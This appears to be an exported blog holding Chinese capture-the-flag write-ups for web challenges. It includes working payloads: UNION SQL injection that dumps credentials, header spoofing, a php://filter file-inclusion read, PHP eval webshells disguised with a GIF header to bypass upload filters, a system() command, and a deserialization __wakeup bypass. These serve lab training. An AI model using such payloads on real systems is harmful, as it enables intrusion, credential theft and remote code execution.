<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rs</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">store_result</span>())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">Close</span>(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">more_results</span>())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">next_result</span>()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.<span class="variable">$mysqli</span>-&gt;errno.<span class="string">&quot; : &quot;</span>.<span class="variable">$mysqli</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>[极客大挑战 2019]LoveSQL 1</title>
    <url>/2021/10/30/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL-1/</url>
    <content><![CDATA[<p>首先按照惯例, 万能密码注入, 成功, 出来个用户名和密码,
然而好像并没有什么用<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301809821.png"
alt="image-20211030180951656" /></p>
<p>然后从<code>order by 1</code>试到<code>order by 3</code>正常回显,
<code>order by 4</code>报错, 得知有3个字段</p>
<p>采用联合查询寻找回显点位:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,2,3;%23</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301818338.png"
alt="image-20211030181855242" />
<figcaption aria-hidden="true">image-20211030181855242</figcaption>
</figure>
<p>可知第2, 3字段数据会被回显,
可以在这两处使用函数database()拿到数据库名:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,database(),3;%23</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301822176.png"
alt="image-20211030182223082" />
<figcaption aria-hidden="true">image-20211030182223082</figcaption>
</figure>
<p>数据库名为geek, 接下来可以进一步拿到表名.</p>
<p>数据库系统中,
自带的<code>information_schema</code>数据库中储存着所有数据库的表名,
字段名等各种信息,
从这里面可以得知<code>geek</code>数据库里的表名和表里的字段名等</p>
<p><code>information_schema.tables</code>表中存储着数据库名对应的所有表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;geek&#x27;;%23</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意<code>table_schema='geek'</code>中的geek要加引号, 因为它是字符串,
当<code>where</code>子句比较对象是数字时,
比如<code>where id &gt; 50</code>时不需要引号.</p>
</blockquote>
<blockquote>
<p><code>group_concat()</code>该字段的所有值合并(默认)以','分隔</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301841257.png"
alt="image-20211030184112176" />
<figcaption aria-hidden="true">image-20211030184112176</figcaption>
</figure>
<p>可以看到,
<code>geek</code>数据库中有两个表<code>geekuser</code>和<code>l0ve1ysq1</code>,
猜测数据就在<code>l0ve1ysq1</code>表中. 同理,
从<code>information_schema.columns</code>里取出<code>l0ve1ysq1</code>的所有字段名,
然后万事俱备, 就可以联合查询拿到表中的所有数据了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;;%23</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301956773.png"
alt="image-20211030195642687" />
<figcaption aria-hidden="true">image-20211030195642687</figcaption>
</figure>
<p>可以看到,共有三个字段<code>id</code>,<code>username</code>,<code>password</code>,
接下来尝试一下提取所有数据(为了方便观察,将<code>id</code>,<code>username</code>,<code>password</code>之间用'-'分割开)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password),3 from geek.l0ve1ysq1;%23</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110302006730.png"
alt="image-20211030200642577" />
<figcaption aria-hidden="true">image-20211030200642577</figcaption>
</figure>
<p>于是我们得到了这样一坨(嗯,一坨)东西,
查看源代码就能提取出来一串凌乱的字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello 1-cl4y-wo_tai_nan_le,2-glzjin-glzjin_wants_a_girlfriend,3-Z4cHAr7zCr-biao_ge_dddd_hm,4-0xC4m3l-linux_chuang_shi_ren,5-Ayrain-a_rua_rain,6-Akko-yan_shi_fu_de_mao_bo_he,7-fouc5-cl4y,8-fouc5-di_2_kuai_fu_ji,9-fouc5-di_3_kuai_fu_ji,10-fouc5-di_4_kuai_fu_ji,11-fouc5-di_5_kuai_fu_ji,12-fouc5-di_6_kuai_fu_ji,13-fouc5-di_7_kuai_fu_ji,14-fouc5-di_8_kuai_fu_ji,15-leixiao-Syc_san_da_hacker,16-flag-flag&#123;e5a2cc9e-e2bb-4410-9fa1-cf8c2361a9b3&#125;！</span><br></pre></td></tr></table></figure>
<p>我们的<strong>flag</strong>就在其中(竟然是用户的密码🙄)</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>[极客大挑战 2019]Http 1</title>
    <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http-1/</url>
    <content><![CDATA[<p>进去之后, 按照惯例, 先查看源代码<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311336770.png" /></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311335125.png"
alt="image-20211031133550064" />
<figcaption aria-hidden="true">image-20211031133550064</figcaption>
</figure>
<p>找到<code>Secret.php</code>这个页面, 进入</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311338983.png"
alt="image-20211031133804874" />
<figcaption aria-hidden="true">image-20211031133804874</figcaption>
</figure>
<p>看提示, 应该是Referer请求头检测, 判断从哪个网站跳转过来的,
上<code>Fiddler</code></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311345734.png" alt="image-20211031134521678" style="zoom:50%;" /></p>
<p><code>Referer</code>伪装好了, 又提示使用"Syclover"浏览器,
那么这次就是判断浏览器<code>UA</code>了,
我们把<code>UA</code>改成"Syclover"试试</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311347388.png" alt="image-20211031134743341" style="zoom:50%;" /></p>
<p>错误又变了, 这次说只能从本地访问,
根据前面的几次经验,这次应该还是判断请求头.
我们要找的那个请求头里肯定记录着请求发起方的IP,
我们只需要将IP改成本地环回地址127.0.0.1即可</p>
<p>经过一番查找,
<code>X-Forwarded-For</code>这个记录着从源主机到经过的所有代理服务器IP,中间以逗号分隔.
为了方便, 我们只需要将其指定为127.0.0.1即可</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311359642.png" alt="image-20211031135902592" style="zoom:50%;" /></p>
<p>这样, 我们就拿到了<strong>flag</strong>~</p>
<blockquote>
<p><a
href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">参考资料</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>[极客大挑战 2019]Knife 1</title>
    <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-1/</url>
    <content><![CDATA[<p>看页面提示,
就是个<code>POST</code>提交参数的<code>webshell</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311304517.png"
alt="image-20211031130415463" />
<figcaption aria-hidden="true">image-20211031130415463</figcaption>
</figure>
<p>在源码里可以找到输出结果, 然后就是传统艺能,
到根目录去看看都有啥好玩意儿</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311331857.png"
alt="image-20211031133142800" />
<figcaption aria-hidden="true">image-20211031133142800</figcaption>
</figure>
<p><strong>flag</strong>就在这里了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syc=system(&quot;cd ../../../../../;ls -la;cat flag&quot;);</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311333863.png"
alt="image-20211031133328805" />
<figcaption aria-hidden="true">image-20211031133328805</figcaption>
</figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>[极客大挑战 2019]Secret File 1</title>
    <url>/2021/10/30/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File-1/</url>
    <content><![CDATA[<p>首先查看源代码,找到入口<code>./Archive_room.php</code><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301139004.png"
alt="image-20211030113938928" /></p>
<p>进入<code>Archiv_room.php</code>, 点击按钮并抓包<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301140021.png"
alt="image-20211030114045966" /></p>
<p>可以看到逻辑就是点击按钮服务器指定跳转到<code>end.php</code> ,
返回的内容中有<code>secr3t.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301143534.png"
alt="image-20211030114309440" />
<figcaption aria-hidden="true">image-20211030114309440</figcaption>
</figure>
<p>进入<code>secr3t.php</code>页面,可见源代码, 有一些过滤,
但是貌似不影响操作<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301146585.png"
alt="image-20211030114612553" /></p>
<p>先试试<code>file=flag.php</code><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301149401.png"
alt="image-20211030114947337" /></p>
<p>显然是不行的, <strong>flag</strong>就在<code>flag.php</code>中,
但是没有被显示出来我们需要拿到<code>flag.php</code>的源代码才行</p>
<p>这里采用<strong>php伪协议</strong>, 实现文件包含,
将源代码文件转换成base64编码显示出来(为什么要用base64编码?因为include引入的文件如果是php文件会被直接执行,
这样就拿不到源码了, 而如果是非php文件就会被显示出来)</p>
<p>构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301204885.png"
alt="image-20211030120426834" />
<figcaption aria-hidden="true">image-20211030120426834</figcaption>
</figure>
<p>再把base64编码的源代码解码就可以拿到<strong>flag</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301205630.png"
alt="image-20211030120555576" />
<figcaption aria-hidden="true">image-20211030120555576</figcaption>
</figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[极客大挑战 2019]Upload 1</title>
    <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload-1/</url>
    <content><![CDATA[<p>进去就是个文件选择框, 先上传个头像上去看看, 用BP抓包</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011616643.png"
alt="image-20211101161653416" />
<figcaption aria-hidden="true">image-20211101161653416</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011617741.png"
alt="image-20211101161704616" />
<figcaption aria-hidden="true">image-20211101161704616</figcaption>
</figure>
<p>正常上传,
下面我们新建个<code>test.php</code>一句话木马文件并上传试试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;shell&quot;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011721015.png"
alt="image-20211101172102928" />
<figcaption aria-hidden="true">image-20211101172102928</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110312113393.png"
alt="image-20211031211321256" />
<figcaption aria-hidden="true">image-20211031211321256</figcaption>
</figure>
<p>显然是不行的, 被识别出来了,
用BP抓包改<code>Content-Type</code>为<code>image/jpeg</code>看看能不能骗过去</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110312200646.png"
alt="image-20211031220038474" />
<figcaption aria-hidden="true">image-20211031220038474</figcaption>
</figure>
<p>错误提示变了,但还是传不上去, 推测可能是文件后缀检测,
可以采用其他后缀绕过,
常见的后缀有<code>php*(如php2, php3), pht, phtm, phtml, phps</code>等</p>
<p>我们试试把后缀改成<code>phtml</code>试试</p>
<blockquote>
<p>注意: 有的后缀即使上传上去了也不能被执行, 取决于服务端配置</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110312229070.png"
alt="image-20211031222954778" />
<figcaption aria-hidden="true">image-20211031222954778</figcaption>
</figure>
<p>错误变了, 说明改后缀是对的, 但是这次又遇到新的检测.
让代码里不包含<code>&lt;?</code>, 只需要换个形式的一句话木马即可:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">langage</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>(@_REQUEST);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110312233021.png"
alt="image-20211031223351820" />
<figcaption aria-hidden="true">image-20211031223351820</figcaption>
</figure>
<p>错误又变了, 被检测到不是图像文件, 检测文件类型很有可能根据文件头了,
我们试着给一句话木马加上一个图像文件的文件头绕过检测</p>
<blockquote>
<p>常见的图片文件头</p>
</blockquote>
<ul>
<li>JPG ：FF D8 FF E0 00 10 4A 46 49 46</li>
<li>GIF(相当于文本的GIF89a)：47 49 46 38 39 61</li>
<li>PNG： 89 50 4E 47</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&quot;shell&quot;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>GIF的文件头最容易添加, 所以这里我们采用它, 其他文件的文件头要利用010
Editor这种十六进制编辑器来进行操作, 不方便</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011630441.png"
alt="image-20211101163042319" />
<figcaption aria-hidden="true">image-20211101163042319</figcaption>
</figure>
<p>一句话木马成功上传了上去, 猜测上传的文件放在upload文件夹中,
试着访问一下执行个指令</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011632322.png"
alt="image-20211101163250245" />
<figcaption aria-hidden="true">image-20211101163250245</figcaption>
</figure>
<p>成功执行, 接下来为了方便操作, 省去手工使用指令的麻烦,
使用<code>中国菜刀</code>和<code>中国蚁剑</code>之类的软件连接<code>webshell</code>,
这里我使用<code>中国蚁剑</code>.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011635938.png"
alt="image-20211101163537861" />
<figcaption aria-hidden="true">image-20211101163537861</figcaption>
</figure>
<p>成功连接, 接下来我们只需要找到<strong>flag</strong>即可,
通过翻查文件目录, 发现<strong>flag</strong>文件就在根目录</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011637358.png"
alt="image-20211101163731288" />
<figcaption aria-hidden="true">image-20211101163731288</figcaption>
</figure>
<p>任务完成~</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>[极客大挑战 2019]PHP 1</title>
    <url>/2021/11/01/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-1/</url>
    <content><![CDATA[<p>进去看到主页是一只猫, 移动鼠标可以用毛线团逗它,
出个题前端也也是费心了</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012309147.png"
alt="image-20211101230918054" />
<figcaption aria-hidden="true">image-20211101230918054</figcaption>
</figure>
<p>上面说, 有<strong>备份</strong>网站的习惯,
所以我们就扫描服务器找出备份文件, 使用<code>dirsearch</code>这个脚本</p>
<p>下载地址: <a
href="https://github.com/maurosoria/dirsearch">Github</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ./dirsearch.py -e php -u http://0c3bed09-f748-4307-ba14-135d78a27e92.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-e 指定服务器运行环境</p>
<p>-u 指定网站目录</p>
</blockquote>
<blockquote>
<p>PS: 我自己扫了很久也没扫完, 看别人的WP扫出了<code>www.zip</code>,
我们就从这里开始</p>
</blockquote>
<p>下载<code>www.zip</code>解压得到5个文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012317474.png"
alt="image-20211101231756440" />
<figcaption aria-hidden="true">image-20211101231756440</figcaption>
</figure>
<p><code>index.php</code>关键代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">	<span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>index.php</code>引入了<code>class.php</code>,
然后反序列化参数<code>select</code>的值,
先去看看<code>class.php</code>有什么</p>
<blockquote>
<p><code>flag.php</code>里的那个<strong>flag</strong>是错的</p>
</blockquote>
<p><code>class.php</code>代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里就要用到<code>php</code>反序列化的知识了,
我们先在本地制作好payload</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012343385.png"
alt="image-20211101234324256" />
<figcaption aria-hidden="true">image-20211101234324256</figcaption>
</figure>
<p>审计代码, 用户名为<code>"admin"</code>,
密码为<code>100</code>(<code>"100"</code>也行, 弱相等)时,
并使<code>__wakeup()</code>不执行, 就能拿到<strong>flag</strong></p>
<p>序列化后的对象:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
<p>当序列化文本中指定的对象属性个数大于实际个数时,
<code>__wakeup()</code>方法就不会被执行 ,实际上是2个, 我们改成3个:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
<p>提交上去看看</p>
<p><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111020001866.png"
alt="image-20211102000144789" />emmm, 跟我想的不一样</p>
<p>经过一番查找得知:
<code>Name</code>类的两个属性是<code>private</code>的, 只能在类中访问,
在序列化后的文本中要用<code>%00</code>将类名和属性名分隔开,
所以正确的序列化文本应该是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
<p>再次提交:</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111020005666.png"
alt="image-20211102000537580" />
<figcaption aria-hidden="true">image-20211102000537580</figcaption>
</figure>
<p>成功拿到<strong>flag</strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
